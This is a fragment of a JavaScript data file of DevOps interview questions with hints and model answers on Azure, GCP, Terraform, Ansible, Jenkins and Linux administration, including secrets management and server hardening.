      { q:'Explain Azure networking: VNets, subnets, NSGs, and private endpoints.', hint:'VNet: isolated network. Subnets: subdivide. NSG: stateful firewall at subnet/NIC level, allow/deny rules. VNet peering. Private Endpoint: private IP for PaaS service inside VNet. Service Endpoint vs Private Endpoint.', answer:`A Virtual Network (VNet) is the fundamental isolation boundary in Azure - resources inside a VNet can communicate; outside cannot without explicit configuration. Subnets subdivide the VNet address space and host resources; each subnet can have an associated Network Security Group. NSGs are stateful firewalls with priority-ordered allow/deny rules evaluated on inbound and outbound traffic - lower priority numbers win. VNet peering connects VNets (including cross-region) with low-latency Microsoft backbone routing. Private Endpoints give a PaaS service (Storage, SQL, Service Bus) a private IP address inside your VNet - traffic never leaves the Microsoft network and the public endpoint can be disabled. This is the preferred pattern for securing PaaS services over Service Endpoints, which grant VNet access to the public endpoint but do not provide a private IP. Network topology for production: hub-and-spoke with Azure Firewall in the hub.` },
      { q:'How do you implement observability for Azure applications?', hint:'Application Insights: traces, dependencies, exceptions, custom events. Azure Monitor: metrics, alerts. Log Analytics workspace: KQL queries. Distributed tracing: correlation IDs propagated across services. Diagnostic settings: route resource logs.', answer:`Application Insights provides application-level observability - SDK auto-instrumentation captures HTTP requests, SQL queries, external dependencies, and exceptions with distributed tracing (correlation IDs link across services and microservices). I configure custom events and metrics for business KPIs (orders placed, payment failures). Azure Monitor collects resource-level metrics (CPU, memory, HTTP 5xx rates) and routes them to Log Analytics workspaces. KQL (Kusto Query Language) queries correlate across logs and metrics - finding the database calls that spike during P99 latency increases. Diagnostic settings on Azure resources route logs to a Log Analytics workspace for centralised querying. Alerts trigger on metric thresholds or log query results. For SLO monitoring I track error rates and latency percentiles in Application Insights dashboards, with paging alerts in Azure Monitor.` },
    ],
    gcp: [
      { q:'What is the GCP resource hierarchy and how does IAM work within it?', hint:'Organisation > Folder > Project > Resource. IAM policies inherit downward. Principle of least privilege. Service Accounts for workloads. Roles: primitive, predefined, custom. Workload Identity for GKE.', answer:`GCP resource hierarchy: Organisation (root, tied to a domain), Folders (for teams or business units), Projects (billing and quota boundary), and Resources. IAM policies are attached at any level and inherited downward - a policy on a Folder applies to all Projects within it. This allows centralising security controls at high levels. Service Accounts represent non-human identities - applications authenticate as Service Accounts rather than user accounts. Roles bundle permissions: primitive roles (Owner/Editor/Viewer) are broad and should be avoided; predefined roles (roles/storage.objectCreator) follow least privilege; custom roles grant specific permissions. Workload Identity Federation in GKE eliminates Service Account key files by binding Kubernetes service accounts to GCP service accounts - pods get tokens automatically, removing the credential management problem.` },
      { q:'Explain Google Kubernetes Engine (GKE) and its managed features compared to self-hosted Kubernetes.', hint:'Managed control plane. Autopilot mode: Google manages nodes. Standard mode: you manage node pools. Node auto-provisioning. Binary Authorization. GKE Workload Identity. Rapid/Regular/Stable release channels.', answer:`GKE is the managed Kubernetes service with the deepest integration with Google Cloud. The control plane is managed and upgraded by Google. Autopilot mode takes this further - Google manages the node infrastructure, you declare workloads and pay per pod, not per node. Standard mode gives control over node pool configuration for teams with specific requirements. GKE integrates with GCP services natively: Workload Identity for pod-level GCP authentication, Cloud Logging and Monitoring for observability, Binary Authorization to enforce only signed container images are deployed. Release channels (Rapid, Regular, Stable) control upgrade cadence. Node auto-provisioning creates node pools with the right machine type and accelerators for pending pods automatically. Compared to self-hosted, GKE eliminates control plane operations and provides native integration with Google networking (VPC-native clusters with alias IPs).` },
      { q:'What is BigQuery and how do you optimise queries for cost and performance?', hint:'Serverless data warehouse. Columnar storage. Partitioned tables: date/range. Clustered tables: co-locate related rows. Avoid SELECT *. Avoid cross-joins. Use APPROX_COUNT_DISTINCT. Cost: bytes processed.', answer:`BigQuery is a serverless, columnar data warehouse that scales to petabytes without infrastructure management. Billing is based on bytes processed (on-demand) or reserved slots (flat-rate). Optimisation starts with table design: partitioned tables (on a date column or integer range) allow queries to prune partitions, reducing bytes scanned dramatically. Clustered tables co-locate rows with similar values in the specified columns, improving filter and aggregation performance. Never use SELECT * - it scans all columns in the columnar store; always select only needed columns. Avoid repeatedly scanning large tables with CTEs - materialise intermediate results in temporary tables. Use APPROX_COUNT_DISTINCT instead of COUNT(DISTINCT ...) for large cardinality estimates. Preview query cost with Query Validator before running. For recurring queries, use materialised views or scheduled queries to pre-aggregate.` },
      { q:'How does Cloud Pub/Sub work and when would you choose it over Cloud Tasks?', hint:'Pub/Sub: async messaging, push/pull, at-least-once delivery, topics/subscriptions, dead-letter topics. Cloud Tasks: HTTP target, scheduled delay, deduplication, specific delivery. Use Pub/Sub for fan-out; Tasks for individual task scheduling.', answer:`Cloud Pub/Sub is an asynchronous messaging service where publishers send messages to topics and subscribers receive from subscriptions - decoupled, with at-least-once delivery and message retention up to 7 days. Pull subscriptions let consumers control processing rate; push subscriptions deliver to HTTPS endpoints. Dead-letter topics capture messages that exceed max delivery attempts. Cloud Tasks is for managing individual task executions with specific targets: dispatch an HTTP request to a specific Cloud Run service with a controlled rate, delay, and deduplication. Pub/Sub is ideal for event broadcasting to multiple consumers (audit logging, multiple microservices reacting to the same event). Cloud Tasks is ideal for reliable HTTP delivery to a single worker - like sending a specific email or triggering a specific job with retry control. For real-time analytics pipelines, Pub/Sub feeds into Dataflow or BigQuery subscriptions.` },
      { q:'Explain Cloud Run and when you would use it instead of GKE.', hint:'Serverless containers. Scales to zero. Request-based billing. Max instances, concurrency settings. Cold starts. Cloud Run Jobs for batch. VPC connector for private resources. Cloud Run vs GKE: operational complexity vs control.', answer:`Cloud Run runs stateless containers in a fully managed, serverless environment - scales from zero to thousands of instances in seconds, billing only for actual request processing time. Deploying is as simple as gcloud run deploy with a container image. It handles HTTPS termination, load balancing, and autoscaling automatically. For Cloud Run I configure min-instances to reduce cold starts for latency-sensitive services, and max-instances for cost caps. VPC connector routes egress to private Cloud SQL or Redis instances. Cloud Run Jobs handle batch workloads that run to completion. I choose Cloud Run over GKE when: the application is stateless and HTTP-driven, I want minimal operational overhead, and traffic is variable (scales to zero saves cost). I choose GKE when I need stateful workloads, custom networking, specific runtime requirements, WebSocket connections, or long-running background processing.` },
      { q:'How do you implement CI/CD on GCP?', hint:'Cloud Build: triggers on push, yaml steps. Artifact Registry: container/package storage. Cloud Deploy: progressive delivery to GKE/Cloud Run. Secret Manager for credentials. Binary Authorization. Workload Identity for keyless auth.', answer:`GCP CI/CD uses Cloud Build as the build executor - triggered by Cloud Source Repositories, GitHub, or GitLab push events. cloudbuild.yaml defines build steps: run tests, build Docker image, push to Artifact Registry, deploy. Artifact Registry stores container images, Maven, npm, and Python packages with IAM-controlled access. Cloud Deploy provides managed continuous delivery with pipelines targeting multiple environments (dev, staging, prod) in sequence, requiring approvals for production promotion and supporting canary and blue/green strategies for GKE and Cloud Run. Credentials are managed through Secret Manager - Cloud Build steps access secrets via substitution variables without exposing them in logs. Workload Identity Federation eliminates service account key files for GitHub Actions deploying to GCP. Binary Authorization enforces that only images built and signed by Cloud Build can be deployed to GKE.` },
      { q:'How does GCP networking differ from AWS? Explain VPCs, load balancers, and CDN.', hint:'GCP VPCs are global (not regional). Subnets are regional. Cloud Load Balancing: global anycast, HTTP(S), TCP, UDP. Cloud CDN integrates with HTTPS Load Balancer. Shared VPC for cross-project networking. Cloud Interconnect/VPN.', answer:`GCP VPCs are global by default - a single VPC spans all regions, with regional subnets. This contrasts with AWS where VPCs are regional. Cloud Load Balancing uses a global anycast IP - a single IP routes traffic to the nearest healthy backend worldwide without region-specific load balancers. The HTTP(S) Load Balancer (Layer 7) integrates with Cloud CDN, Cloud Armor (WAF/DDoS), and IAP (Identity-Aware Proxy). Cloud CDN caches content at Google edge PoPs with a single checkbox on the load balancer backend. Internal HTTP(S) Load Balancer provides Layer 7 load balancing between private services. Shared VPC centralises networking for multiple projects - host project owns the VPC, service projects deploy workloads. Premium Tier routing uses Google backbone for cross-region traffic; Standard Tier uses public internet for lower cost.` },
    ],
    terraform: [
      { q:'Explain the Terraform state file. What problems can it cause and how do you manage it safely?', hint:'State maps real resources to config. Remote state: S3+DynamoDB lock, GCS, Terraform Cloud. terraform.tfstate: never commit. State locking prevents concurrent runs. terraform state commands for manipulation.', answer:`Terraform state is a JSON file that maps your configuration to real infrastructure resources - it tracks resource IDs, attributes, and dependencies. Without it, Terraform cannot know what already exists. Problems: storing state locally is dangerous (lost on disk failure, concurrent runs cause corruption), and the file contains sensitive values in plaintext. Solution: remote state backends - S3 with DynamoDB locking (AWS), GCS with object versioning (GCP), or Terraform Cloud. DynamoDB locking prevents two concurrent terraform apply runs from corrupting state. I never commit .tfstate to git. For sensitive state values, I use encrypted S3 with KMS and restrict IAM access to CI/CD roles. terraform state mv, rm, and import handle edge cases: renaming resources, removing resources from state without destroying, or importing pre-existing resources.` },
      { q:'How do you structure Terraform code for multiple environments and reusability?', hint:'Modules: reusable components. Workspaces vs separate state files. Directory structure: modules/, environments/dev, environments/prod. Variable files (.tfvars). Terragrunt for DRY. Module versioning in registry.', answer:`I structure Terraform as root modules (environments) that call child modules (reusable components). Directory structure: modules/networking, modules/eks-cluster, modules/rds; environments/dev/main.tf, environments/prod/main.tf. Each environment directory has its own state file with environment-specific variable overrides in terraform.tfvars. Modules accept variables and expose outputs - this is the unit of reuse. Terraform workspaces are an alternative but can lead to state management complexity across many environments. For large organisations, Terragrunt eliminates root module duplication by generating provider and backend configurations from a hierarchy of HCL files - the DRY principle applied to Terraform. I version modules with git tags (source = "git::...?ref=v1.2.0") so environment changes are explicit and auditable, not pulled from HEAD.` },
      { q:'What is the difference between terraform plan and terraform apply? How do you handle drift?', hint:'Plan: compares state + real infra to config, produces changeset. Apply: executes changes. Drift: manual changes create discrepancy. terraform refresh. terraform import. Sentinel/OPA for policy-as-code guardrails.', answer:`terraform plan runs a three-way comparison: desired state (config), recorded state (state file), and actual infrastructure (API calls). It produces a changeset showing creates, updates, and destroys. terraform apply executes the changeset, updating state. Drift occurs when someone modifies infrastructure manually - the state no longer matches reality. terraform plan detects drift by making real API calls. terraform refresh updates the state file to match real infrastructure without making changes (deprecated; plan does this implicitly). For accidental drift, I use terraform import to bring existing resources under management. For intentional drift (emergency manual fix), I import then reconcile the config. Policy-as-code tools (Sentinel in Terraform Cloud, OPA/Conftest) run policies against plans before apply - preventing deployments that violate security or cost policies.` },
      { q:'How do you manage secrets in Terraform without storing them in state or code?', hint:'Variables from environment: TF_VAR_. AWS Secrets Manager / HashiCorp Vault data sources. Sensitive variable flag. SOPS for encrypted tfvars. Never hardcode. State encryption.', answer:`Secrets in Terraform require care because values in state are stored in plaintext. Strategies: use environment variables (TF_VAR_db_password) injected by CI/CD rather than tfvars files. Data sources fetch secrets at plan/apply time: data "aws_secretsmanager_secret_version" "db" reads from AWS Secrets Manager - the password is never in code. HashiCorp Vault provider fetches secrets dynamically. Mark outputs and variables as sensitive = true to suppress them in plan output (they are still in state). SOPS (Secrets OPerationS) encrypts .tfvars files with KMS keys - encrypted files are safe to commit. Remote state with encryption at rest and tight IAM prevents state file access. For database passwords, I generate them with random_password and store in Secrets Manager via Terraform - the application reads from Secrets Manager, not Terraform outputs.` },
      { q:'Explain Terraform providers and how you write a custom resource with them.', hint:'Provider: plugin interfacing with an API. terraform init downloads providers from registry. Provider configuration. Resource schema: CRUD functions. Terraform Plugin Framework. Testing: acceptance tests with real API.', answer:`Providers are plugins that Terraform uses to interact with APIs - AWS, GCP, Kubernetes, GitHub all have providers. terraform init downloads provider binaries from the Terraform Registry. Each resource in a provider implements Create, Read, Update, and Delete functions that map Terraform lifecycle operations to API calls. Writing a custom provider: use the Terraform Plugin Framework (the modern approach, replacing SDKv2). Define resource schema with attribute types and validation, implement CRUD functions, test with acceptance tests that create real resources in a real environment. Most teams do not write custom providers but do write custom modules. When an internal API or platform is not covered by an existing provider, a custom provider enables managing it with Terraform alongside other infrastructure, maintaining a single workflow for all infrastructure changes.` },
      { q:'What is terraform import and when do you need it?', hint:'Imports existing real infrastructure into Terraform state without recreating it. Use case: brownfield adoption, emergency manual changes, resource rename. Requires matching config first. Terraform 1.5+: import blocks in config.', answer:`terraform import maps an existing real resource to a Terraform resource block without destroying and recreating it. Use cases: adopting Terraform in an existing environment (brownfield), where infrastructure was provisioned manually or by another tool; recovering from a corrupted state file; and importing resources created in an emergency that bypassed Terraform. The workflow: write the resource block in configuration matching the real resource attributes, then run terraform import resource_type.name resource_id. From Terraform 1.5, import blocks in configuration enable plan-time imports: import { to = aws_instance.web; id = "i-abc123" } and terraform plan generates the configuration. I always run terraform plan after import to verify no unexpected changes are queued - differences between config and real state will appear as updates.` },
      { q:'How do you test Terraform code?', hint:'terraform validate: syntax. terraform plan: intent verification. Checkov/tfsec: static security analysis. Terratest (Go): acceptance tests deploying real infra. kitchen-terraform. OPA/Conftest: policy tests on plan JSON.', answer:`Terraform testing is layered. terraform validate checks syntax and internal consistency without making API calls. terraform plan reveals intent - reviewing the plan is itself a test. For automated testing, I run terraform plan in CI and use tools like conftest with OPA policies to assert properties of the plan JSON: no security groups with 0.0.0.0/0 ingress on port 22, all S3 buckets have encryption enabled. tfsec and Checkov do static analysis of Terraform code for security misconfigurations without running. Terratest (Go) writes acceptance tests that actually deploy infrastructure, assert state, and destroy it - these are expensive but catch provider-level bugs. For module testing, terraform test (native, introduced in 1.6) runs test blocks that can mock providers or use real ones with ephemeral resources.` },
    ],
    ansible: [
      { q:'Explain the Ansible architecture: control node, managed nodes, inventory, and playbooks.', hint:'Control node runs ansible/ansible-playbook. Managed nodes: SSH (Linux) or WinRM (Windows), no agent. Inventory: static (INI/YAML) or dynamic (scripts/plugins). Playbook: YAML plays targeting host groups.', answer:`Ansible is agentless - the control node connects to managed nodes over SSH (Linux) or WinRM (Windows) and executes modules by copying Python scripts temporarily. No daemon is needed on managed nodes, which reduces operational overhead. Inventory defines the managed nodes, organized in groups (webservers, databases) with host-level and group-level variables. Static inventory is INI or YAML files; dynamic inventory uses scripts or plugins (aws_ec2, gcp_compute) to query live infrastructure. A playbook is a YAML file containing plays - each play targets a host group and runs tasks sequentially. Tasks invoke modules (apt, copy, template, service, aws_ec2) to achieve desired state. Ansible is idempotent: running the same playbook twice produces no changes the second time if the system is already in the desired state.` },
      { q:'How do Ansible roles work and how do you structure them?', hint:'Role: directory structure with tasks, handlers, templates, files, vars, defaults, meta. ansible-galaxy init. Reusable, independently versioned. Collections bundle roles+modules. Galaxy/Automation Hub for sharing.', answer:`An Ansible role is a structured, reusable unit of automation with a standard directory layout: tasks/main.yml (task list), handlers/main.yml (triggered actions), templates/ (Jinja2 .j2 files), files/ (static files), vars/main.yml (higher-priority variables), defaults/main.yml (overridable defaults), and meta/main.yml (dependencies and Galaxy metadata). This structure allows roles to be developed, tested, and versioned independently. ansible-galaxy init my_role creates the skeleton. Collections are the newer unit - they bundle roles, modules, plugins, and playbooks into a namespace (community.mysql, amazon.aws). I use roles for repeatable server configuration (nginx setup, user management) and call them in site.yml playbooks with the roles: directive or include_role task for conditional execution.` },
      { q:'How do you handle secrets in Ansible?', hint:'Ansible Vault: encrypt variables/files with AES-256. ansible-vault encrypt/decrypt/edit. Vault ID for multiple passwords. --vault-password-file or --ask-vault-pass. Integration with HashiCorp Vault, AWS Secrets Manager via lookup plugins.', answer:`Ansible Vault encrypts sensitive variables and files with AES-256. I encrypt individual variable files (vars/secrets.yml) with ansible-vault encrypt, commit the encrypted file, and provide the vault password at runtime via --vault-password-file (CI/CD reads from a secret store) or --ask-vault-pass for interactive use. Vault IDs allow different passwords for different environments - dev, staging, prod can have separate vault passwords reducing blast radius. For more dynamic secret management, lookup plugins fetch secrets at runtime: "{{ lookup('aws_ssm', '/app/db_password') }}" or "{{ lookup('hashi_vault', 'secret=kv/app:password') }}" - secrets are never stored in files. I never commit unencrypted secrets or use clear-text passwords in playbooks.` },
      { q:'What is Ansible idempotency and why does it matter?', hint:'Idempotent: running multiple times = same result as running once. Built-in module idempotency: apt, file, user. Command/shell modules are NOT idempotent by default: use creates/removes or when conditions. Check mode dry run.', answer:`Idempotency means running a playbook once or ten times produces the same system state - no unintended side effects on repeated runs. This matters for reliability: playbooks can be re-run after failures, during audits, or as cron jobs to enforce desired state without risk. Ansible built-in modules are idempotent - the apt module checks if the package is installed before installing; the file module checks permissions before changing them; the user module checks existence before creating. The command and shell modules execute raw commands unconditionally and are therefore not idempotent by default. I make them idempotent by adding creates: (only run if this path does not exist) or removes: (only run if this path exists) parameters, or using a when: condition that checks state first. Check mode (--check) does a dry run to show what would change without applying changes.` },
      { q:'How do you test Ansible playbooks and roles?', hint:'Molecule: create test scenarios with Docker or VMs. Verifier: Testinfra (Python assertions) or Ansible tasks. ansible-lint: style and correctness. Check mode. Integration tests in CI.', answer:`Molecule is the standard tool for testing Ansible roles. It creates a test scenario that launches ephemeral instances (Docker containers, Vagrant VMs, cloud instances), applies the role, runs a verifier (Testinfra Python assertions or Ansible verify tasks), and destroys the instances. A Molecule scenario: molecule/default/molecule.yml defines the platform (docker image), converge.yml applies the role, verify.yml asserts the expected state (nginx is running, port 80 is open, config file contains expected content). ansible-lint enforces best practices and catches common mistakes. I run Molecule in CI on pull requests - the pipeline runs molecule test which creates, converges, verifies, and destroys. For syntax checking without running tasks, ansible-playbook --syntax-check catches YAML errors quickly.` },
      { q:'How do you use Ansible for configuration drift detection?', hint:'Check mode (--check): reports what would change. Diff mode (--diff): shows file content changes. Compare to desired state. Schedule regular check runs. Integrate with monitoring/alerting.', answer:`Configuration drift occurs when managed nodes diverge from the desired state defined in playbooks - caused by manual changes, failed partial runs, or software updates. Ansible detects drift with check mode: ansible-playbook site.yml --check --diff reports all changes that would be made without applying them, and --diff shows file content differences. I schedule nightly check mode runs in CI/CD, capturing the output as a report. If the report shows non-empty changes, it triggers an alert indicating drift has occurred. The remediation is running the full playbook to restore desired state. For continuous compliance, I integrate Ansible check mode with a monitoring tool - tasks that show changed in check mode are reported as configuration violations. This is different from Puppet/Chef push models; Ansible check mode gives periodic snapshots rather than continuous enforcement.` },
      { q:'What are Ansible facts and how do you use them in playbooks?', hint:'Facts: auto-discovered host info via setup module. ansible_os_family, ansible_distribution, ansible_default_ipv4.address, ansible_memtotal_mb. set_fact for custom facts. Cached facts: fact_caching in ansible.cfg. Magic variables: hostvars, groups.', answer:`Facts are system information automatically gathered by the setup module at the start of each play - hardware specs, OS distribution, network interfaces, environment variables, mounted filesystems. I use them for conditionals: when: ansible_os_family == "Debian" uses apt; when: ansible_os_family == "RedHat" uses dnf. ansible_distribution_version guards tasks against version-specific behaviour. set_fact creates custom facts mid-playbook - useful for calculated values or results from previous tasks. hostvars['db01']['ansible_default_ipv4']['address'] accesses another host's facts for templating application configs. Facts are cached in Redis or JSON files for performance when managing large inventories - subsequent plays within the same run skip the setup module. I gather_facts: false for plays that do not need facts to speed up execution on large host sets.` },
    ],
    jenkins: [
      { q:'Explain Jenkins pipelines. What is the difference between declarative and scripted pipelines?', hint:'Declarative: structured, agent, stages, steps, post. Scripted: Groovy DSL, more flexibility, node{} blocks. Declarative preferred for readability. Jenkinsfile in SCM. Shared libraries for DRY.', answer:`A Jenkins Pipeline defines the CI/CD workflow as code in a Jenkinsfile stored in the repository. Declarative pipeline has a structured syntax with a pipeline block containing agent, stages, and post sections - simpler to read and write, with built-in validation and a visual stage view in the Blue Ocean UI. Scripted pipeline is a full Groovy DSL inside node blocks - more flexible for complex logic but harder to read and maintain. I default to declarative and drop to script {} blocks for complex Groovy logic when needed. Shared libraries extract common pipeline code into a separate repository - functions defined in vars/deploy.groovy are reusable across many Jenkinsfiles with @Library('my-shared-lib') import, preventing copy-paste pipeline code.` },
      { q:'How does Jenkins handle credentials and secrets securely?', hint:'Credentials Plugin: username/password, SSH keys, secret text, certificates. Binding Plugin: withCredentials{} injects into environment. Credentials never in Jenkinsfile or logs. HashiCorp Vault Plugin. Credential scopes: global vs folder.', answer:`Jenkins Credentials Plugin stores secrets encrypted in Jenkins home directory, accessible via credential IDs. Never hardcode passwords in Jenkinsfiles. The Withcredentials step injects credentials into the block scope: withCredentials([usernamePassword(credentialsId: 'docker-hub', usernameVariable: 'USER', passwordVariable: 'PASS')]) { sh 'docker login -u $USER -p $PASS' } - Jenkins masks these values in log output automatically. SSH Private Key credentials are injected as files: sshAgent(['ssh-key-id']) { sh 'git push ...' }. For dynamic secrets, the HashiCorp Vault Plugin fetches credentials from Vault at pipeline runtime - secrets are never stored in Jenkins. Credential scopes: global credentials are accessible everywhere; folder-scoped credentials restrict access to pipelines within a specific folder, following least-privilege.` },
      { q:'How do you scale Jenkins with agents and distributed builds?', hint:'Controller (master): orchestration only, no builds. Agents (workers): run builds. Kubernetes plugin: ephemeral pod-based agents. Cloud plugins: EC2, GCP. Labels for agent selection. Agent templates. JNLP vs SSH connection.', answer:`The Jenkins controller should only orchestrate - running builds on the controller is a security and stability risk. Agents (formerly called slaves) run the actual build steps. Static agents connect via SSH or JNLP and are always running - wasteful and require ongoing maintenance. The Kubernetes Plugin creates ephemeral pod-based agents on demand: when a build starts, a pod is created (using a custom Docker image with all tools), the build runs, and the pod is destroyed. This scales to zero when idle and scales out for parallel builds automatically. Pods are defined in a Kubernetes pod template in the Jenkinsfile: agent { kubernetes { yaml "..." } }. EC2 plugin provisions cloud VMs on demand for non-Kubernetes environments. Labels route specific jobs to agents with required tools (docker, android-sdk) via agent { label 'docker' }.` },
      { q:'How do you implement pipeline security and access control in Jenkins?', hint:'Role-Based Access Control (RBAC) plugin. Folder-based permissions. Script Security: approved signatures for Groovy. In-process Script Approval. Job DSL sandbox. Restrict who can run builds. Audit Trail plugin.', answer:`Jenkins security is layered. Authentication: LDAP or SAML integration for SSO. Authorisation: the Role Strategy Plugin implements RBAC - define roles (admin, developer, readonly) with specific permissions (Overall/Read, Job/Build, Credentials/Create) and assign to users/groups. Folder-based roles restrict permissions to a subset of jobs. Script security is critical - Groovy pipelines run in the Jenkins JVM, so arbitrary code is dangerous. The Script Security Plugin sandboxes pipelines, blocking unsafe method calls unless explicitly approved by an admin in the In-process Script Approval. Declarative pipelines have a smaller attack surface than scripted. I review script approvals carefully - approving Groovy.execute() or Runtime.getRuntime() would be dangerous. The Audit Trail Plugin logs all user actions for compliance.` },
      { q:'How do you implement parallel execution and stages in Jenkins pipelines?', hint:'parallel{} block in declarative. Fail fast option. Stage grouping. Matrix: multiple axes. Parallel test execution. Aggregating test results. Resource allocation between parallel stages.', answer:`Parallel stages dramatically reduce pipeline duration. In declarative pipelines, the parallel directive inside a stage block runs multiple branches simultaneously: parallel { stage('Unit Tests') { steps { sh 'npm test' } } stage('Lint') { steps { sh 'npm run lint' } } }. failFast: true stops all parallel branches when any branch fails, preventing wasted computation. The matrix directive is more powerful for multi-dimensional testing: axes { axis { name 'OS'; values 'linux', 'windows' } axis { name 'NODE_VERSION'; values '16', '18', '20' } } runs all combinations. JUnit results from parallel test runs are aggregated by the junit step. For resource management, throttle-concurrent-builds plugin prevents too many resource-intensive builds from running simultaneously. I profile build time to find the bottleneck stages worth parallelising first.` },
      { q:'How do you integrate Jenkins with Docker for builds?', hint:'Build Docker image in pipeline. Docker Plugin or docker CLI. Multi-stage Dockerfile for smaller images. Push to registry. docker.withRegistry(). Docker-in-Docker vs mounting socket. Cache layers across builds.', answer:`Docker integration in Jenkins pipelines: the agent can be a Docker container (agent { docker { image 'node:18' } }) so the build runs inside a fresh container with all tools - no dependency pollution between builds. For building images, I use docker.build('my-app:\${env.BUILD_NUMBER}') and docker.withRegistry('https://registry.hub.docker.com', 'dockerhub-credentials') { image.push() } to authenticate and push. Docker-in-Docker (DinD) runs Docker inside the agent container - it works but has security implications (privileged containers). The recommended approach is mounting the Docker socket (/var/run/docker.sock) from the agent into the container, which uses the host Docker daemon. Multi-stage Dockerfile separates build and runtime stages to produce minimal production images. I cache Docker layers by using --cache-from with the previous build's image to speed up layer rebuilds.` },
      { q:'How do you handle pipeline failures and notifications in Jenkins?', hint:'post{} block: always, success, failure, unstable, aborted. Email notification plugin. Slack plugin. PagerDuty integration. Build status badge. Retry logic. Timeout. Error handling in Groovy try/catch.', answer:`Jenkins pipeline failure handling uses the post block with conditions: post { failure { emailext to: 'team@company.com', subject: 'Build failed: \${env.JOB_NAME}' } success { slackSend channel: '#deploys', message: 'Deploy successful' } always { junit 'reports/**/*.xml'; cleanWs() } }. The Slack Notification plugin sends build status to channels. I integrate with PagerDuty for production deployment failures. Retry logic wraps flaky steps: retry(3) { sh 'flaky-test.sh' }. timeout prevents hung builds: timeout(time: 30, unit: 'MINUTES') { ... } aborts if the build exceeds the limit. For error handling in scripted steps, try/catch/finally in Groovy allows custom error handling and cleanup. Build status (UNSTABLE vs FAILED) distinguishes test failures from pipeline errors - UNSTABLE fails tests but does not block deployment; FAILURE stops everything.` },
    ],
    linux: [
      { q:'Explain Linux process management: how do you monitor and troubleshoot high CPU or memory usage?', hint:'top/htop: real-time. ps aux. /proc/<pid>. kill/kill -9. nice/renice. strace: system calls. lsof: open files. vmstat, iostat, sar. OOM killer logs.', answer:`For real-time process monitoring, top and htop show CPU, memory, and process hierarchy. ps aux | sort -k3 -rn shows processes sorted by CPU. ps aux | sort -k4 -rn sorts by memory. For a specific PID, /proc/<pid>/status contains memory details (VmRSS for resident memory) and /proc/<pid>/fd/ shows open file descriptors. For CPU profiling, perf top shows which functions consume CPU. strace -p <pid> traces system calls in real time - useful for diagnosing why a process is blocked. lsof -p <pid> shows all open files, sockets, and pipes. For memory issues, /var/log/syslog or dmesg | grep -i oom shows OOM killer events indicating which process was killed and why. vmstat gives overall system virtual memory statistics. iostat diagnoses disk I/O bottlenecks causing apparent CPU wait.` },
      { q:'How does Linux file system permissions work? Explain chmod, chown, and ACLs.', hint:'rwx: 4+2+1. ugo: user/group/other. setuid, setgid, sticky bit. chmod numerical and symbolic. chown user:group. ACLs: getfacl/setfacl for fine-grained control. umask.', answer:`Linux permissions are a 3x3 grid: read(4), write(2), execute(1) for user, group, and other. chmod 755 sets rwxr-xr-x. Symbolic: chmod u+x,g-w file. Special bits: setuid (4xxx) on executables runs as the file owner regardless of who executes it (sudo uses this); setgid (2xxx) on directories makes new files inherit the directory group; sticky bit (1xxx) on directories prevents users deleting others files (e.g., /tmp). chown user:group changes ownership. Standard permissions have limitations - they cannot grant a specific user access without adding them to a group. ACLs solve this: setfacl -m u:john:rw file grants john read/write without changing group. getfacl shows all ACL entries. umask sets the default permission mask for new files (umask 022 creates files as 644 and directories as 755).` },
      { q:'Explain Linux networking tools and how you diagnose connectivity issues.', hint:'ip addr/route/link. ss -tunlp (replaces netstat). ping, traceroute. curl -v. tcpdump. nslookup/dig. iptables -L. /etc/hosts, /etc/resolv.conf. NetworkManager/systemd-networkd.', answer:`Diagnosing connectivity follows a layered approach. Physical/link: ip link show checks interface status. IP layer: ip addr show verifies IP assignment; ip route show checks routing table. Name resolution: dig domain.com queries DNS directly; cat /etc/resolv.conf shows configured nameservers. Application layer: curl -v url shows full HTTP request/response including DNS timing, TCP handshake, and TLS. ss -tunlp shows listening sockets and which process owns them. For deep packet inspection, tcpdump -i eth0 -n port 80 captures traffic - tcpdump -w capture.pcap saves for Wireshark analysis. For firewall issues, iptables -L -n -v shows rules with packet counts - zero packets through an ACCEPT rule means traffic is not reaching that rule. traceroute identifies at which hop packets are dropped. ping with -c and -i tests basic ICMP reachability.` },
      { q:'How does systemd work? How do you manage and troubleshoot services?', hint:'systemctl start/stop/enable/disable/status. Unit files: /etc/systemd/system/. Service type: simple, forking, oneshot, notify. Dependencies: Requires, After, WantedBy. journalctl for logs. Override with systemctl edit.', answer:`Systemd is the init system managing services, targets (runlevels), mounts, and timers. systemctl status nginx shows service state, PID, and recent log lines. systemctl enable creates symlinks for automatic startup; disable removes them. Unit files in /etc/systemd/system/ define services: [Unit] section with Description, Requires (hard dependency), After (ordering); [Service] section with ExecStart, Restart (on-failure), User, EnvironmentFile; [Install] section with WantedBy=multi-user.target. systemctl edit service creates an override drop-in without modifying the package-installed unit file. journalctl -u nginx --since "1 hour ago" queries structured logs. journalctl -f follows logs in real time. For debugging a failing service, systemctl status shows exit code and signal; journalctl -xe shows recent system log context. systemd-analyze blame shows which services slow boot.` },
      { q:'How do you secure a Linux server?', hint:'Disable root SSH login: PermitRootLogin no. Key-based auth only: PasswordAuthentication no. fail2ban. UFW/iptables firewall. Automatic security updates. Principle of least privilege. auditd. Disable unused services. SSH port change.', answer:`Linux hardening follows a checklist. SSH: disable password authentication (PasswordAuthentication no in sshd_config), disable root login (PermitRootLogin no), use key-based authentication only, change from port 22 (reduces scanner noise). Firewall: UFW (ufw allow 22; ufw allow 80; ufw enable) or iptables with DROP default policy - allow only required ports. fail2ban monitors auth logs and bans IPs with repeated failed login attempts. User management: principle of least privilege - avoid sudo all permissions, use specific sudo rules for specific commands. Disable unused services (systemctl disable bluetooth). Automatic security updates (unattended-upgrades on Ubuntu). File integrity monitoring with AIDE or Tripwire detects unauthorised changes. auditd logs security-relevant events (file access, privilege escalation). AppArmor or SELinux provide mandatory access control - MAC policies restrict what processes can access even as root.` },
